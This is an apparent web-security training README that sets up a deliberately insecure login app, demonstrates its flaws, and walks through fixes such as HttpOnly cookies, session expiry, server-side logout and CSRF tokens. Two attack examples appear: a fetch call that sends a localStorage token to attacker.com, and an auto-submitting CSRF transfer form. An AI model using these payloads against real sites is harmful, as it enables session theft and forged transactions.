# Getting Started - Exercise 2: Secure Authentication

## ⚠️ Security Warning

This exercise contains **intentionally insecure authentication** to demonstrate vulnerabilities. DO NOT use in production!

---

## 🎯 Your Mission

Fix all authentication security issues:
1. localStorage token storage
2. Missing CSRF protection
3. No session expiration
4. Insecure logout
5. No SameSite cookies

---

## 🚀 Setup

### Terminal 1: Start Backend Server
```bash
cd server
npm install
npm run server
```

Backend runs on http://localhost:3001

### Terminal 2: Start Frontend
```bash
npm install
npm run dev
```

Frontend runs on http://localhost:5173

---

## 🧪 Test the Vulnerabilities

### Vulnerability #1: Token in localStorage

1. Login with:
   - Email: `user@example.com`
   - Password: `password123`

2. Open DevTools → Application → Local Storage

3. You'll see:
   ```
   authToken: "token_1_1234567890"
   user: {"id":1,"email":"user@example.com",...}
   ```

**Problem:** Any XSS attack can steal this:
```javascript
// Attacker's code
fetch('https://attacker.com/steal?token=' + localStorage.getItem('authToken'))
```

---

### Vulnerability #2: No Session Expiration

1. Login
2. Close browser completely
3. Open again and go to http://localhost:5173
4. Still logged in! ❌

**Problem:** Token never expires. Stolen token works forever!

---

### Vulnerability #3: Insecure Logout

1. Login
2. Open DevTools Console
3. Copy your token: `localStorage.getItem('authToken')`
4. Logout
5. Paste this in Console:
   ```javascript
   localStorage.setItem('authToken', 'YOUR_TOKEN_HERE');
   location.reload();
   ```
6. You're logged in again! ❌

**Problem:** Server session not invalidated!

---

### Vulnerability #4: No CSRF Protection

If you were logged in, an attacker could make requests on your behalf:

```html
<!-- Attacker's website -->
<form action="http://localhost:3001/api/transfer" method="POST">
  <input name="to" value="attacker@evil.com">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

---

## 🐛 What to Fix

### 1. Replace localStorage with HttpOnly Cookies

**Change from:**
```javascript
// ❌ Client-side accessible
localStorage.setItem('authToken', token);
```

**To:**
```javascript
// ✅ HttpOnly cookie (not accessible to JavaScript)
// Set on server:
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000 // 1 hour
});
```

---

### 2. Add Session Expiration

```javascript
// Server checks expiration
const session = sessions.get(token);
if (Date.now() - session.createdAt > 3600000) { // 1 hour
  sessions.delete(token);
  return res.status(401).json({ error: 'Session expired' });
}
```

---

### 3. Proper Logout

```javascript
// Server must delete session
app.post('/api/auth/logout', (req, res) => {
  const token = req.cookies.session;
  sessions.delete(token); // Actually delete!
  res.clearCookie('session');
  res.json({ message: 'Logged out' });
});
```

---

### 4. CSRF Protection

Add CSRF tokens:
```javascript
// Server generates token
const csrfToken = generateRandomToken();
sessions.set(token, { ...session, csrfToken });

// Client includes in requests
fetch('/api/endpoint', {
  headers: {
    'X-CSRF-Token': csrfToken
  }
});

// Server validates
if (req.headers['x-csrf-token'] !== session.csrfToken) {
  return res.status(403).json({ error: 'CSRF token invalid' });
}
```

---

### 5. SameSite Cookies

```javascript
res.cookie('session', token, {
  sameSite: 'strict' // Prevents CSRF attacks
});
```

**Options:**
- `strict` - Never send cross-site (safest)
- `lax` - Send on top-level navigation
- `none` - Always send (requires `secure: true`)

---

## ✅ Success Criteria

Your fixed version should:
- ✅ No tokens in localStorage
- ✅ Use HttpOnly cookies
- ✅ Sessions expire after 1 hour
- ✅ Logout invalidates server session
- ✅ CSRF protection implemented
- ✅ SameSite cookie attribute set
- ✅ Secure flag on cookies (HTTPS)

---

## 💡 Hints

1. **Backend changes required:**
   - Change `/api/auth/login` to set HttpOnly cookie
   - Add session expiration checking
   - Fix logout to delete session
   - Add CSRF token generation

2. **Frontend changes required:**
   - Remove localStorage code
   - Send cookies automatically with `credentials: 'include'`
   - Include CSRF token in headers
   - Handle 401 responses

3. **Testing:**
   ```javascript
   // After fixing, this should return undefined:
   console.log(document.cookie); // session cookie is HttpOnly!
   ```

---

## 📚 Resources

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookie Explanation](https://web.dev/samesite-cookies-explained/)

---

**Ready? Start fixing the authentication vulnerabilities!** 🔒

